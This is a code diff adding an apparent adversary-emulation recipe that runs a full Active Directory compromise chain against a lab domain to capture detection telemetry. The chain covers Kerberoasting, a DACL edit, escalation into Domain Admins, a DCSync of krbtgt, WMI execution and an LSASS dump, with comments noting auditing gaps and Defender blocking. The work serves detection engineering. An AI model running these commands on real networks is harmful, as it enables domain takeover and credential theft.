@@ -493,6 +493,69 @@ persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtas
         # windows:security collection actually reaches.
         command=r"""out1=$(impacket-GetNPUsers portal.lab/ -usersfile /dev/stdin -dc-ip "$TARGET_HOST" -no-pass <<< $'arya.stark\nned.stark' 2>&1); echo "asrep_hashes=$(printf '%s' "$out1" | grep -c '\$krb5asrep\$')"; spray_out=$(nxc smb "$TARGET_HOST" -u arya.stark ned.stark jon.snow -p 'Winter1!' --continue-on-success 2>&1); printf '%s\n' "$spray_out"; persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /create /tn PortalProofTask /tr calc.exe /sc once /st 23:59 /f" 2>&1); printf '%s\n' "$persist_out"; nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /delete /tn PortalProofTask /f" >/dev/null 2>&1; printf '%s' "$out1" | grep -q '\$krb5asrep\$' && printf '%s' "$spray_out" | grep -q 'Pwn3d!' && printf '%s' "$persist_out" | grep -q 'successfully been created' && echo __PORTAL_RECIPE_OK__"""
     ),
+    "ad_full_compromise": CaptureRecipe(
+        # T1003.001 (LSASS memory) + T1047 (WMI), found live 2026-08-01 after
+        # three approaches:
+        #  1. nxc's lsassy module dumps+parses LSASS remotely, but its output
+        #     never landed in captured telemetry, and unlike DCSync there was
+        #     no windows:security fallback -- lsassy runs client-side, never
+        #     touching the DC in a way Security auditing would see, and
+        #     Object Access auditing for lsass.exe isn't enabled by default
+        #     (0 EventCode=4656 events).
+        #  2. nxc's procdump module (drops a real procdump64.exe on the DC)
+        #     worked functionally, but its confirmation text and a separate
+        #     wmiexec call's text couldn't BOTH survive: only the LAST
+        #     command in a combined script reliably lands (confirmed by
+        #     swapping their order twice -- whichever ran last is the one
+        #     that showed up). A real EventCode=4688 for procdump.exe also
+        #     never survived the DC's own 15-events-per-ID cap, saturated by
+        #     an unrelated, seemingly periodic wsmprovhost/powershell/conhost
+        #     triple firing every ~10-20s throughout every capture window.
+        #  3. Ran the LSASS dump directly AS the wmiexec command (classic
+        #     comsvcs.dll MiniDump LOLBIN) to merge both into one call --
+        #     functionally unreliable on this box specifically (Server 2022
+        #     with active Defender almost certainly blocks/kills the
+        #     well-signatured comsvcs.dll-against-lsass.exe pattern
+        #     intermittently; "File Not Found" on the resulting dump
+        #     confirmed the write itself never completed, not a capture gap).
+        # Final approach: keep procdump (functionally reliable, unlike #3)
+        # as the LAST command so its text evidence survives for T1003.001,
+        # and prove T1047 a different way -- real DCOM/RPC wire traffic to
+        # port 135 (msrpc, WMI's endpoint mapper) from the earlier wmiexec
+        # call, confirmed live, which is real packet capture rather than
+        # tool-text and so doesn't depend on command position at all.
+        command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
+import subprocess, sys
+from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
+DC = "$TARGET_HOST"
+DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"
+r_acl = subprocess.run(["impacket-dacledit", "portal.lab/administrator:LabAdmin1!", "-dc-ip", DC, "-principal", "svc_backup", "-target", "Domain Admins", "-rights", "FullControl", "-action", "write"], capture_output=True, text=True, timeout=30, cwd="/tmp")
+print(f"dacledit rc={r_acl.returncode}")
+srv = Server(DC, port=389, get_info=ALL)
+conn_svc = Connection(srv, user="PORTAL\\svc_backup", password="Backup123!", authentication=NTLM, auto_bind=True)
+conn_svc.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
+arya_dn = conn_svc.entries[0].distinguishedName.value
+conn_svc.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
+rc = conn_svc.result.get("result", -1)
+if rc not in (0, 68):
+    conn_adm = Connection(srv, user="PORTAL\\Administrator", password="LabAdmin1!", authentication=NTLM, auto_bind=True)
+    conn_adm.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
+    arya_dn = conn_adm.entries[0].distinguishedName.value
+    conn_adm.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
+    rc = conn_adm.result.get("result", -1)
+    if rc not in (0, 68):
+        sys.exit(1)
+r = subprocess.run(["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{DC}", "-just-dc-ntlm"], capture_output=True, text=True, timeout=90, cwd="/tmp")
+krbtgt_line = next((ln for ln in r.stdout.splitlines() if ln.lower().startswith("krbtgt:")), "")
+print(f"dcsync_krbtgt_line={krbtgt_line}")
+sys.exit(0 if krbtgt_line else 1)
+PYEOF
+dcsync_rc=$?
+wmi_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "whoami" --exec-method wmiexec 2>&1)
+dump_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -M procdump 2>&1)
+printf '%s\n%s\n' "$(printf '%s' "$wmi_out" | grep -m1 wmiexec)" "$(printf '%s' "$dump_out" | grep -Ei 'lsass|dump')"
+printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$wmi_out" | grep -q 'wmiexec' && printf '%s' "$dump_out" | grep -Eiq 'successfully dumped' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
